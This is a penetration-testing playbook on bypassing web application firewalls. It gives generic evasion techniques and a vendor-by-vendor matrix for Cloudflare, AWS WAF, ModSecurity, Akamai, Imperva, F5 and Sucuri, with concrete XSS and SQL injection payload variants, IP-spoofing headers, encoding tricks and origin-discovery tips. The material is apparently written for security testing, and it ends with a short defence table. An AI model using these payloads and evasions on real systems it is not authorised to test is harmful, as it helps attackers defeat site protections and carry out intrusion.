# WAF Bypass Techniques — Evasion Playbook


## 1. PHASE 0 — IDENTIFY THE WAF

Before bypassing, know what you're fighting.

### 1.1 Tools

| Tool | Usage |
|---|---|
| `wafw00f target.com` | Fingerprint WAF vendor from response headers/behavior |
| `nmap --script=http-waf-detect` | NSE script for WAF detection |
| Manual header inspection | `Server`, `X-CDN`, `X-Cache`, `cf-ray` (Cloudflare), `x-sucuri-id`, `x-akamai-*` |

### 1.2 Behavioral Fingerprinting

```
1. Send benign request → record baseline response (status, headers, body size)
2. Send obvious attack: /?q=<script>alert(1)</script>
3. Compare: 403? Custom block page? Redirect? Connection reset?
4. Block page content reveals WAF: "Cloudflare", "Access Denied (Imperva)", "ModSecurity"
5. If transparent proxy: check response time difference (WAF adds latency)
```

## 2. GENERIC BYPASS CATEGORIES

### 2.1 Encoding Bypasses

| Technique | Example | Bypasses |
|---|---|---|
| URL encoding | `%3Cscript%3E` | Basic string matching |
| Double URL encoding | `%253Cscript%253E` | WAFs that decode once, app decodes twice |
| Unicode encoding | `%u003Cscript%u003E` | IIS-specific Unicode normalization |
| HTML entities | `&#60;script&#62;` or `&#x3c;script&#x3e;` | WAFs not performing HTML entity decoding |
| Hex encoding (SQL) | `0x756E696F6E` = `union` | WAFs matching SQL keywords |
| Octal encoding | `\74script\76` | Rare but some parsers handle it |
| Overlong UTF-8 | `%C0%BC` (invalid encoding for `<`) | Legacy parsers with loose UTF-8 handling |
| Mixed case | `SeLeCt`, `uNiOn` | Case-sensitive rule matching |
| Null byte | `sel%00ect` | WAFs that stop parsing at null |

### 2.2 Chunked Transfer Encoding

Split the payload across HTTP chunks so no single chunk contains the blocked pattern:

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
sel
3
ect
1
 
4
from
0

```

WAFs that inspect the full body may not reassemble chunks before matching.

### 2.3 HTTP/2 Binary Format Bypasses

HTTP/2 transmits headers as binary HPACK-encoded frames. Some WAFs only inspect after downgrading to HTTP/1.1:

- Header names can contain characters illegal in HTTP/1.1
- Pseudo-headers (`:method`, `:path`) bypass header-based WAF rules
- H2 → H1 downgrade may introduce request smuggling (see [request-smuggling](http-smuggling-test.md))

### 2.4 HTTP Parameter Pollution (HPP)

Different servers handle duplicate parameters differently:

| Server | Behavior for `?a=1&a=2` |
|---|---|
| PHP/Apache | Last value: `a=2` |
| ASP.NET/IIS | Concatenated: `a=1,2` |
| Python/Flask | First value: `a=1` |
| Node.js/Express | Array: `a=[1,2]` |

WAF checks `a=1` (benign), app uses `a=2` (malicious). Or combine: `a=sel&a=ect` → ASP.NET sees `a=sel,ect`.

### 2.5 IP Source Spoofing (Bypass IP-Based Rules)

Headers trusted by some WAFs/apps for client IP:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

Use case: WAF whitelists internal IPs or has different rule sets per source.

### 2.6 Path Normalization Tricks

| Technique | Example | Effect |
|---|---|---|
| Dot segments | `/./admin` or `/../target/admin` | WAF sees different path than app |
| Double slash | `//admin` | Some normalizers collapse, WAFs may not |
| URL encoding path | `/%61dmin` | WAF sees encoded, app decodes |
| Null byte in path | `/admin%00.jpg` | Legacy: app truncates at null, WAF sees .jpg |
| Backslash (IIS) | `/admin\..\/secret` | IIS treats `\` as `/` |
| Trailing dot/space | `/admin.` or `/admin%20` | OS-level normalization (Windows) |
| Semicolon (Tomcat) | `/admin;jsessionid=x` | Tomcat strips after `;`, WAF may not |

### 2.7 Content-Type Manipulation

WAFs often have format-specific parsers. Switching Content-Type can bypass rules:

```
Default:  Content-Type: application/x-www-form-urlencoded  → WAF parses params
Switch:   Content-Type: application/json  → WAF may not parse JSON body
Switch:   Content-Type: multipart/form-data  → WAF may not inspect all parts
Switch:   Content-Type: text/xml  → WAF expects XML, payload in different format
```

**Trick**: If app accepts both JSON and form-urlencoded, use JSON — WAFs often have weaker JSON inspection rules.

### 2.8 Multipart Boundary Abuse

```http
Content-Type: multipart/form-data; boundary=----WAFBypass

------WAFBypass
Content-Disposition: form-data; name="q"

<script>alert(1)</script>
------WAFBypass--
```

Variations: long boundary strings, boundary with special characters, missing final boundary, nested multipart.

### 2.9 Newline & Whitespace Injection

```sql
-- SQL keyword splitting
SEL
ECT * FROM users

-- SQL comment insertion
SEL/**/ECT * FR/**/OM users
UN/**/ION SEL/**/ECT 1,2,3

-- Tab/vertical tab as separator
SELECT\t*\tFROM\tusers
```

### 2.10 Keyword Splitting & Alternative Syntax

| Blocked | Alternative |
|---|---|
| `UNION SELECT` | `UNION ALL SELECT`, `UNION DISTINCT SELECT` |
| `OR 1=1` | `OR 2>1`, `OR 'a'='a'`, `||1` |
| `<script>` | `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>` |
| `alert(1)` | `prompt(1)`, `confirm(1)`, `print()` (Chrome) |
| `eval()` | `Function('code')()`, `setTimeout('code',0)` |
| `' OR '1'='1` | `' OR 1-- -`, `'\|\|'1` |
| `SLEEP(5)` | `BENCHMARK(5000000,SHA1('x'))`, `pg_sleep(5)` |

## 3. PROTOCOL-LEVEL BYPASS TECHNIQUES

### 3.1 Request Line Abuse

```http
GET /path?q=attack HTTP/1.1    ← WAF inspects
```

vs.

```http
GET http://target.com/path?q=attack HTTP/1.1   ← Absolute URI: some WAFs miss the path
```

### 3.2 Header Injection via CRLF

If WAF inspects original headers but app processes injected ones:

```
X-Custom: value\r\nX-Forwarded-For: 127.0.0.1
```

### 3.3 Connection-State Bypass

```
1. Establish connection through WAF (normal request)
2. On same keep-alive connection, send attack request
3. Some WAFs reduce inspection on subsequent requests in same connection
```

## 5. COMMON MISTAKES & TRICK NOTES

1. **Test bypass with actual exploitation, not just 200 OK**: WAF may return 200 but strip the payload silently.
2. **WAFs often have size limits**: Very large request bodies (>8KB–128KB depending on WAF) may bypass inspection entirely.
3. **Rate limiting ≠ WAF**: Getting 429s is rate limiting, not payload blocking. Different bypass needed.
4. **CDN caching**: If the WAF is at CDN level, cached responses bypass WAF on subsequent requests. Poison cache with clean request, exploit cache.
5. **Origin server direct access**: If you find the origin IP behind CDN/WAF, connect directly — WAF is bypassed completely.
6. **Multipart file upload fields**: WAFs often skip inspection of file content in multipart uploads — embed payload in filename or file content if reflected.

## 6. DEFENSE PERSPECTIVE

| Measure | Notes |
|---|---|
| WAF + application-level input validation | WAF is a layer, not a fix |
| Parameterized queries | Eliminates SQLi regardless of WAF |
| CSP + output encoding | Eliminates XSS regardless of WAF |
| Regularly update WAF rules | Vendor signatures lag behind new bypasses |
| Deny by default, not block-list | Allowlist valid input patterns |
| Log and alert on WAF blocks | Bypass attempts are visible in logs |

## 附件：WAF_PRODUCT_MATRIX

# WAF Product Bypass Matrix


## 1. Cloudflare WAF

### Detection

- `cf-ray` header, `Server: cloudflare`, block page references "Cloudflare"
- Cookie: `__cfduid`, `__cf_bm`

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Unicode normalization | Cloudflare normalizes Unicode differently than backend — `＜script＞` (fullwidth) may pass WAF but render as `<script>` |
| Chunked body | Split payloads across HTTP chunks; Cloudflare may not reassemble before inspection |
| Payload mutation (SQLi) | `/*!50000UniOn*/SeLeCt` — MySQL version comments bypass keyword matching |
| Payload mutation (XSS) | `<svg/onload=alert&#40;1&#41;>`, `<details open ontoggle=alert(1)>` |
| Origin direct access | Find origin IP via DNS history, Shodan `ssl.cert.subject.cn:target.com`, email headers |
| JSON body | Switch from form-urlencoded to JSON — different parser, weaker rules |
| Super-long parameter names | Parameter name >128 chars may cause Cloudflare to skip inspection |

### Cloudflare-Specific Notes

- Cloudflare has multiple WAF modes: "Managed Rules" (Cloudflare-authored) and "OWASP ModSecurity Core Rule Set". Each has different bypass surfaces.
- Cloudflare's free-tier WAF has significantly fewer rules than Business/Enterprise.
- Browser Integrity Check and Bot Management are separate from WAF — don't confuse them.

---

## 2. AWS WAF

### Detection

- `x-amzn-requestid` header, runs in front of ALB/CloudFront/API Gateway
- Block response often returns 403 with JSON body or custom error page

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Regex complexity | AWS WAF regex rules have execution time limits — complex input can cause regex to timeout → request passes |
| Size limits | AWS WAF inspects first 8KB of body (16KB for CloudFront). Payload after this boundary is uninspected |
| Custom rule gaps | Default AWS Managed Rules miss many edge cases; custom rules often have logic errors |
| JSON depth | Deeply nested JSON objects may exceed parser depth limits |
| Base64 in parameters | AWS WAF doesn't auto-decode Base64 in parameter values (unless custom transform configured) |
| URI vs body rules | Rules may cover URI but not body, or vice versa — test both |

### AWS WAF-Specific Notes

- AWS WAF v2 (WAFV2) has `SizeConstraintStatement` — bodies over the size limit are either blocked or allowed, depending on config. If "allow on oversize", pad payload beyond 8KB.
- AWS Managed Rule Groups update regularly but lag behind novel attack patterns.
- IP reputation lists may be stale — new IPs from cloud providers often aren't listed.

---

## 3. ModSecurity + OWASP CRS

### Detection

- `Server: Apache` or `nginx` with ModSecurity module
- Block page: "ModSecurity" reference, or generic 403
- Error contains rule ID (e.g., `id:942100`)

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Paranoia Level (PL) gaps | PL1 (default) has minimal rules; PL2-4 progressively stricter. Most deployments run PL1-2, missing many attack patterns |
| Rule ID specific bypass | Each rule targets specific patterns — identify blocking rule ID from error, craft bypass for that specific regex |
| SQL comment injection | `/*! ... */` MySQL conditional comments bypass many CRS SQLi rules |
| Unicode in PL1 | PL1 doesn't check Unicode-encoded payloads: `%u0027` for `'` |
| Transformation order | CRS applies `t:urlDecodeUni,t:htmlEntityDecode` but not all transformations on all rules |
| Multipart parser | CRS multipart parsing can be confused by malformed boundaries |
| Request body limit | `SecRequestBodyLimit` default is 13MB — but `SecRequestBodyNoFilesLimit` is only 128KB (changeable). Payloads in file upload fields bypass body rules if only `NoFiles` limit is enforced |

### CRS-Specific Notes

- CRS v4 (2023+) significantly improved coverage vs v3. Check target's CRS version.
- Anomaly scoring mode: individual rule violations add to score, blocked only if total exceeds threshold. Keep individual violations below detection but accumulate effect.
- `SecRuleRemoveById` directives in config may disable specific rules — test for holes.

---

## 4. Akamai (Kona Site Defender / App & API Protector)

### Detection

- `Server: AkamaiGHost`, `x-akamai-*` headers
- Error reference number in block page

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Header injection | Akamai processes certain headers differently; `X-Forwarded-Host` injection can confuse routing |
| Encoding chains | Triple encoding or mixed encoding (URL + Unicode + HTML) |
| JSON body bypass | Akamai's JSON parser may not inspect deeply nested objects |
| Slow POST | Akamai has timeout-based protections; slow delivery may cause incomplete inspection |
| HTTP/2 push | H2 server push responses may bypass WAF inspection |
| IP rotation | Akamai rate limits per IP; rotating source IPs avoids behavioral blocks |

### Akamai-Specific Notes

- Akamai has "Adaptive Security Engine" — it learns application behavior. New attack patterns that don't match learned behavior may bypass initially.
- Penalty box: after triggering Akamai WAF, your IP may be rate-limited for minutes. Use fresh IP for each test.
- Akamai Pragma headers (`Pragma: akamai-x-check-cacheable`) can leak internal routing information useful for understanding the setup.

---

## 5. Imperva / Incapsula

### Detection

- `X-CDN: Imperva`, `Set-Cookie: incap_ses_*`, `visid_incap_*`
- Block page: "Powered by Incapsula" or Imperva branding

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Parameter pollution | Duplicate parameters: Imperva inspects one occurrence, app processes another |
| JSON deep nesting | `{"a":{"b":{"c":{"d":"payload"}}}}` — deeply nested JSON exceeds parser depth |
| Multipart abuse | Malformed multipart boundaries confuse Imperva's parser |
| UTF-8 BOM injection | `\xEF\xBB\xBF` at start of body may shift parser alignment |
| Large Cookie header | Extremely long Cookie headers may cause truncated inspection |
| WebSocket upgrade | After WebSocket upgrade, subsequent traffic may bypass WAF inspection |

### Imperva-Specific Notes

- Imperva has "Client Classification" — browser fingerprinting. Headless browsers may be blocked before WAF rules even apply. Use real browser fingerprints.
- Imperva's API security module is separate from web WAF — API endpoints may have weaker protection.
- Custom rules in Imperva use "IncapRule" syntax — misconfigurations are common.

---

## 6. F5 BIG-IP ASM / Advanced WAF

### Detection

- `Server: BigIP`, `BIGipServer` cookie, `TS` cookie prefix
- Block page: "The requested URL was rejected" with support ID

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Serialized format bypass | ASM has weak inspection of serialized data (Java, PHP, .NET serialization) |
| JSON/XML content switching | Switch between JSON and XML — ASM may have different rule sets per content type |
| Parameter meta-characters | ASM's "meta-character enforcement" can be bypassed with double encoding |
| Cookie manipulation | ASM sets tracking cookies; modifying them can cause session tracking issues that affect rule application |
| Evasion techniques | ASM has explicit "evasion detection" for directory traversal, multiple encoding, etc. But combinations of techniques may still bypass |
| Learning mode exploitation | If ASM is in "transparent" (learning) mode, no blocking occurs — test with obviously malicious payload first |

### F5-Specific Notes

- BIG-IP ASM distinguishes between "attack signatures" and "violations". Signatures are pattern-based; violations are structural (parameter length, data type). Both must be bypassed.
- ASM's "Bot Defense" module is separate and can be detected via JavaScript challenge injection.
- The `TS` cookie contains session data — tampering with it causes ASM to treat the request as a new session.

---

## 7. Sucuri WAF

### Detection

- `Server: Sucuri/Cloudproxy`, `X-Sucuri-ID` header
- Block page: "Access Denied - Sucuri Website Firewall"

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Tag/event combos | Sucuri blocks common XSS tags but may miss: `<svg/onload>`, `<details/ontoggle>`, `<marquee onstart>` |
| SQL function alternatives | `MID()` instead of `SUBSTRING()`, `CONV()` for hex conversion |
| Path traversal encoding | `..%252f..%252f` (double URL encode) for directory traversal |
| Origin direct access | Sucuri is a reverse proxy; origin IP discovery bypasses it entirely |
| HTTP method switch | Sucuri may have different rules for GET vs POST vs PUT |
| Null byte injection | `%00` in parameter values may truncate Sucuri's inspection |

### Sucuri-Specific Notes

- Sucuri is common on WordPress sites — combine with WordPress-specific attack vectors.
- Sucuri's "Hardening" features (block PHP in uploads, etc.) are separate from WAF rules.
- Free Sucuri tier has significantly weaker WAF rules than paid tiers.
